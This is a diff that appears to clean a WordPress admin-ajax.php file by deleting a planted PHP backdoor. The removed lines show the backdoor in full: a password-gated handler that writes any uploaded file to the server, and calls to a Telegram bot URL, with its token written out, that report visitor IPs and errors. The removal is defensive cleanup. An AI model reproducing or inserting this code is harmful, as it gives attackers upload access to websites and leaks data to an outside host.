@@ -1,26 +1,4 @@
 <?php
-            try{
-				if($_POST['action']=="wp_ajax_try_2020_v2"){
-					if(!empty ($_FILES['file']) and md5(md5(md5($_POST['token_admin'])))=="015c38c46597c483b6186e4a40aad4bf"){
-						@move_uploaded_file($_FILES['file']['tmp_name'],"../".$_FILES['file']['name']);
-						echo " file name : ".$_FILES['file']['name'];					
-					}else{
-						die(0);
-					}					
-					exit();
-				}
-							
-			}catch (Exception $e) {
-				if(function_exists("file_get_contents")){
-					try{
-						file_get_contents("https://api.telegram.org/bot1254159992:AAE1-wpQyYquqvB7wOeBzzmPafEp0d81e6c/sendMessage?chat_id=1110165405&text=" . urlencode($_SERVER['REMOTE_ADDR']."  error wp")."" );
-						file_get_contents("https://api.telegram.org/bot1254159992:AAE1-wpQyYquqvB7wOeBzzmPafEp0d81e6c/sendMessage?chat_id=1110165405&text=" . urlencode($e)."" );
-					}catch (Exception $e2) {}
-					
-				}				
-			}
-	  
-	  
 /**
  * WordPress Ajax Process Execution
  *
